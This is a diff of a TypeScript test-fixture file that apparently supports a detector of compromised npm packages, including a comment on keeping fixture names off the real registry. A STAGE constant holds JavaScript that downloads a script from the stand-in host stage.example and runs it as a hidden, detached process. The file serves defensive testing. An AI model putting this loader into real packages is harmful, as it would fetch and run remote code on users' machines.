@@ -12,9 +12,9 @@ const lib = (name: string, version: string, manifest: Record<string, unknown>, r
 
 // Naming rule: a fixture package name must not exist on the npm registry, or the fixture would show a real package as compromised.
 // Check each name with: curl -s -o /dev/null -w '%{http_code}' https://registry.npmjs.org/<name>  (it must print 404; a scoped name
-// is written @scope%2fname). The -x suffix marks the names whose plain form is on npm (kv-store, code-guard, ipc-bus and
-// flow-agent-kit are), so a fixture never shares a name with a real package; a name that already returns 404 keeps its plain form, and
-// any new name only has to return 404.
+// is written @scope%2fname). The -x suffix marks a fixture renamed away from a real package: kv-store, code-guard and ipc-bus
+// were earlier fixture names, and flow-agent-kit is the real package that flow-agent-kit-x would otherwise share a name with.
+// A name that already returns 404 keeps its plain form, and any new name only has to return 404.
 export interface HeldOutCase extends Case { disclosed: string; source: string }
 
 const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;
